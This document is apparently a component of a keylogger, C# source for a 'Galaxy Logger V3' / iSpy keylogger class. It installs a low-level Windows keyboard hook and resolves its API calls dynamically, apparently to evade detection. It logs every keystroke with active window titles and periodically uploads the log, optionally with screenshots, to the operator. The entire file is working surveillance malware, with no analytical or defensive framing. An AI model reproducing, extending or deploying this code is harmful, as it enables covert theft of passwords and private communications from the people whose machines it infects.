using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace iSpy
{
    public class Keylogger
    {
        private static LowLevelKeyboardProc keyboardProc = Hook;
        private static IntPtr hWnd = IntPtr.Zero;
        private static string currentWindowTitle = string.Empty;
        private static string lastWindowTitle = string.Empty;
        public static string recordedKeystrokes = string.Empty;


        private delegate IntPtr GetForegroundWindow();
        private static GetForegroundWindow DynamicGetForegroundWindow;

        private delegate int GetWindowTextA(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        private static GetWindowTextA DynamicGetWindowTextA;

        private delegate IntPtr SetWindowsHookExA(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        private static SetWindowsHookExA DynamicSetWindowsHookExA;

        private delegate IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        private static CallNextHookEx DynamicCallNextHookEx;

        private delegate IntPtr GetModuleHandleW(string lpModuleName);
        private static GetModuleHandleW DynamicGetModuleHandleW;

        public static void Initialize()
        {
            DynamicGetForegroundWindow = Core.CreateAPI<GetForegroundWindow>(Core.USER32, "GetForegroundWindow");
            DynamicCallNextHookEx = Core.CreateAPI<CallNextHookEx>(Core.USER32, "CallNextHookEx");
            DynamicSetWindowsHookExA = Core.CreateAPI<SetWindowsHookExA>(Core.USER32, "SetWindowsHookExW");
            DynamicGetWindowTextA = Core.CreateAPI<GetWindowTextA>(Core.USER32, "GetWindowTextA");
            DynamicGetModuleHandleW = Core.CreateAPI<GetModuleHandleW>(Core.KERNEL32, "GetModuleHandleW");
        }

        public static void Start()
        {
            new Thread(new ThreadStart(WindowMonitor)).Start();
            new Thread(new ThreadStart(Monitor)).Start();
            new Thread(new ThreadStart(SendLogs)).Start();
        }
        private static void Monitor()
        {
            hWnd = SetHook(keyboardProc);
            Application.Run();
        }
        private static void SendLogs()
        {
            while (true)
            {
                try
                {
                    Thread.Sleep(Convert.ToInt32(Config.LOG_INTERVAL) * 60000);
                    if (!string.IsNullOrEmpty(Config.SEND_SCREENSHOTS))
                        recordedKeystrokes = Core.UploadScreenshot() + recordedKeystrokes;
                    if (Core.Upload("Galaxy Logger V3 Keystrokes", recordedKeystrokes, "1"))
                    {
                        recordedKeystrokes = Environment.NewLine + "[===== " + currentWindowTitle + " (" + DateTime.Now.ToLongTimeString() + ") " + "=====]" + Environment.NewLine;
                    }
                }
                catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            }
        }

        private static void WindowMonitor()
        {
            while (true)
            {
                currentWindowTitle = GetWindowTitle();
                if (!currentWindowTitle.Equals(lastWindowTitle))
                {
                    recordedKeystrokes += Environment.NewLine + "[===== " + currentWindowTitle + " (" + DateTime.Now.ToLongTimeString() + ") " + "=====]" + Environment.NewLine;
                    lastWindowTitle = currentWindowTitle;
                }
                Thread.Sleep(500);
            }
        }

        private static string GetWindowTitle()
        {
            IntPtr hwnd = DynamicGetForegroundWindow();
            StringBuilder builder = new StringBuilder(256);
            if (DynamicGetWindowTextA(hwnd, builder, 256) > 0)
                return builder.ToString();
            return string.Empty;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc keyboardProc)
        {
            try
            {
                using (Process curProcc = Process.GetCurrentProcess())
                using (ProcessModule procmod = curProcc.MainModule)
                {
                    return DynamicSetWindowsHookExA(13, keyboardProc, DynamicGetModuleHandleW(procmod.ModuleName), 0);
                }
            }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            return IntPtr.Zero;
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)0x0100)
                {
                    int keyValue = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)keyValue;
                    if (keyValue >= 65 && keyValue <= 90) // or 94 or 95
                    {
                        if (Control.IsKeyLocked(Keys.CapsLock) && (Control.ModifierKeys != 0 && Keys.Shift != 0))
                        {
                            recordedKeystrokes += key.ToString().ToLower();
                        }
                        else if (Control.IsKeyLocked(Keys.CapsLock) || (Control.ModifierKeys != 0 && Keys.Shift != 0))
                        {
                            recordedKeystrokes += key.ToString();
                        }
                        else
                        {
                            recordedKeystrokes += key.ToString().ToLower();
                        }
                    }
                    else if (keyValue == 13)
                    {
                        recordedKeystrokes += Environment.NewLine;
                    }
                    else if (keyValue == 8)
                    {
                        recordedKeystrokes += "[BACK]";
                    }
                    else if (keyValue == 32)
                    {
                        recordedKeystrokes += " ";
                    }
                    else if (keyValue >= 48 && keyValue <= 57)
                    {
                        if (Control.ModifierKeys != 0 && Keys.Shift != 0)
                        {
                            switch (key.ToString())
                            {
                                case "D1": recordedKeystrokes += "!"; break;
                                case "D2": recordedKeystrokes += "@"; break;
                                case "D3": recordedKeystrokes += "#"; break;
                                case "D4": recordedKeystrokes += "$"; break;
                                case "D5": recordedKeystrokes += "%"; break;
                                case "D6": recordedKeystrokes += "^"; break;
                                case "D7": recordedKeystrokes += "&"; break;
                                case "D8": recordedKeystrokes += "*"; break;
                                case "D9": recordedKeystrokes += "("; break;
                                case "D0": recordedKeystrokes += ")"; break;
                            }
                        }
                        else
                        {
                            recordedKeystrokes += key.ToString().Replace("D", "");
                        }
                    }
                    else if (keyValue >= 96 && keyValue <= 105)
                    {
                        recordedKeystrokes += key.ToString().Replace("NumPad", "");
                    }
                    else if (keyValue >= 106 && keyValue <= 111)
                    {
                        switch (key.ToString())
                        {
                            case "Subtract": recordedKeystrokes += "-"; break;
                            case "Add": recordedKeystrokes += "+"; break;
                            case "Decimal": recordedKeystrokes += "."; break;
                            case "Divide": recordedKeystrokes += "/"; break;
                            case "Multiply": recordedKeystrokes += "*"; break;
                        }
                    }
                    else if (keyValue >= 186 && keyValue <= 222)
                    {
                        if ((Control.ModifierKeys != 0 && Keys.Shift != 0))
                        {
                            switch (key.ToString())
                            {
                                case "OemMinus": recordedKeystrokes += "_"; break;
                                case "Oemplus": recordedKeystrokes += "+"; break;
                                case "OemOpenBrackets": recordedKeystrokes += "{"; break;
                                case "Oem6": recordedKeystrokes += "}"; break;
                                case "Oem5": recordedKeystrokes += "|"; break;
                                case "Oem1": recordedKeystrokes += ":"; break;
                                case "Oem7": recordedKeystrokes += "\""; break;
                                case "Oemcomma": recordedKeystrokes += "<"; break;
                                case "OemPeriod": recordedKeystrokes += ">"; break;
                                case "OemQuestion": recordedKeystrokes += "?"; break;
                                case "Oemtilde": recordedKeystrokes += "~"; break;
                            }
                        }
                        else
                        {
                            switch (key.ToString())
                            {
                                case "OemMinus": recordedKeystrokes += "-"; break;
                                case "Oemplus": recordedKeystrokes += "="; break;
                                case "OemOpenBrackets": recordedKeystrokes += "["; break;
                                case "Oem6": recordedKeystrokes += "]"; break;
                                case "Oem5": recordedKeystrokes += "\\"; break;
                                case "Oem1": recordedKeystrokes += ";"; break;
                                case "Oem7": recordedKeystrokes += "'"; break;
                                case "Oemcomma": recordedKeystrokes += ","; break;
                                case "OemPeriod": recordedKeystrokes += "."; break;
                                case "OemQuestion": recordedKeystrokes += "?"; break;
                                case "Oemtilde": recordedKeystrokes += "`"; break;
                            }
                        }
                    }
                    else
                    {
                        switch (keyValue)
                        {
                            //Keys that I don't want to log
                            case 20: //Capital
                            case 91: //LWin
                            case 92: //RWin
                            case 93: //Apps
                            case 160: //LShiftKey
                            case 161: //RShiftKey
                            //case 162: //LControlKey
                            //case 163:  //RControlKey
                            case 164: //LMenu
                            case 165: //RMenu
                            // case 131072: //Control
                            case 37: //Left
                            case 38: //Up
                            case 39: //Right
                            case 40: //Down
                                break;
                            default:
                                //recordedKeystrokes += VKCodeToUnicode((uint)key).ToUpper();
                                recordedKeystrokes += "[" + (((Keys)keyValue).ToString().ToUpper()) + "]";
                                break;
                        }
                    }

                }
            }
            catch { }
            //return CallAPI<IntPtr>("user32", "CallNextHookEx", new Type[] { typeof(IntPtr), typeof(int), typeof(IntPtr), typeof(IntPtr) }, hookhandle, aVar, bVar, cVar);
            return DynamicCallNextHookEx(hWnd, nCode, wParam, lParam);
        }
    }
}
